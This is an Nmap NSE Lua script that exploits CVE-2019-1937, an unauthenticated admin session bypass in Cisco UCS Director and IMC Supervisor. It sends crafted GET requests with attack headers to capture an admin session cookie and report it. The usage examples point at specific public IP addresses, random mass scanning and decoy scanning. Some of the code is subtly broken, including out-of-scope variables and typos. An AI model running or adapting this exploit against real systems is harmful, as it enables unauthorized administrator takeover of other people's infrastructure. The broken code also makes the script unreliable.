---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.4
-- Affected versions: Cisco UCS Director 6.6.0 <=> 6.7.0
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80,443
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Pedro Ribeiro}
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "uri=/,verbose=true" 137.44.25.194
nmap -sS -Pn -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3" 50.117.40.77
nmap -sS -Pn -n -v -T4 -iR 700 -p 80,443 --open --reason --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -T4 -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse 137.44.25.194
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "uri=/,verbose=true" 137.44.25.194
-- nmap -sS -Pn -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3" 50.117.40.77
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80,443 --open --reason --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 443/tcp open  https  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   Cisco UCS Supervisor (Web Interface Auth Bypass)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-1937
-- |   Risk factor: Critical  CVSSv2: 10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
-- |     Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
-- |     to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
-- |     is due to insufficient request header validation during the authentication process. An attacker could exploit this
-- |     vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
-- |     to use the acquired session token to gain full administrator access to the affected device.
-- |
-- |   Disclosure date: 2019-Ago-21
-- |   Exploit results:
-- |     Uri: https://192.168.1.71:443/app/ui/ClientServlet?apiName=GetUserInfo
-- |     Auth-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
-- |     LoginAccess: admin
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-1937
-- |     https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
-- |     https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
-- |_
-- @args verbose => Display Error(s) verbose outputs  - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: Android; Mobile; Firefox 45.0
-- @args uri => the Full URL to send in GET requests  - Default: /app/ui/ClientServlet?apiName=GetUserInfo
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 443}, "http, https", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local decoy_agent = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/app/ui/ClientServlet?apiName=GetUserInfo"
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local uri_stats,cookie_stats,ip_addr = nil


-- Capture (Local) distro flavor { windows | Linux }
local socket = io.popen("ver 2>&1") --> supress io.popen() stdout error msg (2>&1)
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()
if ( flavor == nil or flavor == "" or string.find(flavor, "not found") ) then
   local socket = io.popen("uname -s")
   flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
   socket.close()
end


if (string.find(flavor, "Linux")) then
   -- Executing BASH command(s) and storing results
   -- Storing network interface in use { wlan0 | eth0 }
   local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
   local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
   socket:close()
   -- Storing Internal IP address to be used in header['host'] and header['referer']
   local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
   ip_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from ip addr
   socket:close()
elseif (string.find(flavor, "windows")) then
   -- Executing CMD command and storing results
   -- Storing Internal IP address to be used in header['host'] and header['referer']
   local socket = io.popen("ipconfig|FINDSTR IPv4")
   ip_addr = socket:read("*a"):gsub("Autoconfiguration IPv4 Address. . : ", ""):gsub("\n", "")
   socket.close()
elseif (not(string.find(flavor, "Linux") or string.find(flavor, "windows")) and verbose == "true") then
   -- This nse script its written to execute ONLY in (Local) Windows or Linux Operative Systems
   print("cve-2019-1937:\n| Cisco UCS (Web Interface Auth Bypass)\n| State: NOT VULNERABLE to CVE-2019-1937\n|   Reason: ["..flavor.."] not compatible operative system\n|_")
   return nil
end


-- Identify servers that answer 200 to invalid HTTP requests
-- and exit as these would invalidate the next nse tests
local status_404, result_404, _ = http.identify_404(host, port)
if ( status_404 and result_404 == 200 ) then
   print("CVE-2019-1937:\n| Exiting: "..host.ip..":"..port.number..uri.." (false positive)\n|   Reason: All URIs tested return status [200] OK\n|_")
   return nil
end


-- Send [1ยบ] GET request - to capture header['Location']
if ( not(ip_addr == nil or string.find(ip_addr , "not found")) ) then
local _decoy = {header={}} --> Build TCP request 'header'
_decoy['header']['Host'] = ip_addr
_decoy['header']['User-Agent'] = decoy_agent
_decoy['header']['Cache-Control'] = "no-store"
_decoy['header']['X-Requested-With'] = "XMLHttpRequest"
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
if ( port.number == 443 ) then
   _decoy['header']['Referer'] = "https://"..ip_addr.."/"
else
   _decoy['header']['Referer'] = "http://"..ip_addr.."/"
end

   -- Send [1ยบ] GET request and read response
   local response = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(response or response.status) ) then
      uri_stats = "uri not found"
   elseif (response and response.status == 302) then
      -- if [302] then Grab redirection url to use on next GET request
      local redirection = response.header and response.header['Location'] or ""
      if ( not(redirection == nil or redirection == "") ) then
         if (port.number == 443) then
            uri = redirection:gsub("Location: https://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         else
            uri = redirection:gsub("Location: http://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         end
      else
         -- None redirection Location received
         uri_stats = "none redirection"
      end
   else
      -- Wrong uri status code received (not vuln)
      uri_stats = "Wrong uri status code received"
   end
end


-- Send [2ยบ] GET request - Follow the redirection uri to capture Set-Cookie { auth cookie }
-- JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
if ( uri_stats == "true" ) then
   local res = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(res or res.status) ) then
      cookie_stats = "none redirection"
   elseif (res and res.status == 200) then
      -- if [200] then Grab Set-Cookie value to use on next GET request
      local set_cookie = response.header and response.header['Set-Cookie'] or ""
      if ( not(set_cookie == nil or set_cookie == "") ) then
         local parse_cookie = set_cookie:gsub("Set-Cookie: ", ""):gsub("; Path=/app; Secure; HttpOnly", "")
         cookie_stats = "true"
      else
         cookie_stats = "none cookie"
      end
   elseif (response and response.status ~= 200) then
      -- Wrong uri status code received (not vuln)
      cookie_stats = "wrong status code"
   end
end


-- Build Nmap vulnerable {table}
local vuln_table = {
   title = "Cisco UCS Supervisor (Web Interface Auth Bypass)",
   state = vulns.STATE.NOT_VULN,
   IDS = {CVE = 'CVE-2019-1937'},
   risk_factor = "Critical",
      scores = {
         CVSSv2 = "10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
      },
   description = [[
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.
]],
   references = {
     'https://nvd.nist.gov/vuln/detail/CVE-2019-1937',
     'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby',
     'https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html',
   },
   dates = {
      disclosure = {year = '2019', month = 'Ago', day = '21'},
   },
   exploit_results = {}, --> Display auth cookie and creds
}

-- Build vulnerable stdout { vuln_table }
if (uri_stats == "true" and cookie_stats == "true") then
   if (port.number == 443) then
      table.insert(vuln_table.exploit_results, string.format("Uri: https://"..host.ip..":"..port.number..uri))
   else
      table.insert(vuln_table.exploit_results, string.format("Uri: http://"..host.ip..":"..port.number..uri))
   end
   table.insert(vuln_table.exploit_results, string.format("Auth-Cookie: "..parse_cookie))
   table.insert(vuln_table.exploit_results, string.format("LoginAccess: admin\n"))
end


-- Send [3ยบ] GET request - admin session cookie Authentication
if (uri_stats == "true" and cookie_stats == "true") then
uri = "/app/ui/ClientServlet?apiName=GetUserInfo"
local _send = {header={}} --> Build TCP request 'header'
_send['header']['Host'] = ip_addr
_send['header']['User-Agent'] = decoy_agent
_send['header']['Cookie'] = parse_cookie..";"
_send['header']['Cache-Control'] = "no-store"
_send['header']['X-Requested-With'] = "XMLHttpRequest"
_send['header']['X-Starship-UserSession-Key'] = "ssa"
_send['header']['X-Starship-Request-Key'] = "redteam"
_send['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
if ( port.number == 443 ) then
   _send['header']['Referer'] = "https://"..ip_addr.."/"
else
   _send['header']['Referer'] = "http://"..ip_addr.."/"
end

   -- Send [3ยบ] GET request and read response
   local vuln_test = http.get(host, port, uri, _send, { no_cache = true, no_cache_body = true })
   if (vuln_test and vuln_test.status == 200) then
      vuln_table.state = vulns.STATE.VULN
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
   elseif (vuln_test.status ~= 200 and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: [?] POSSIBLE VULNERABLE to CVE-2019-1937\n    Remark: Host did NOT accepted header[cookie] authentication\n    Response:\n"..vuln_test.boby.."\n\n"
   end

   -- Error messages { verbose=true }
   elseif (uri_stats == "uri not found" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [001] uri not found\n\n"
   elseif (uri_stats == "none redirection" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [002] header['Location'] not found\n\n"
   elseif (uri_stats == "Wrong uri status code received" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [003] Wrong uri status code received\n\n"
   elseif (cookie_stats == "none redirection" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [004] redirection GET request not accepted\n\n"
   elseif (cookie_stats == "none cookie" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [005] auth cookie not found\n\n"
   elseif (cookie_stats == "wrong status code" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [006] auth cookie wrong status code\n\n"
   end
end
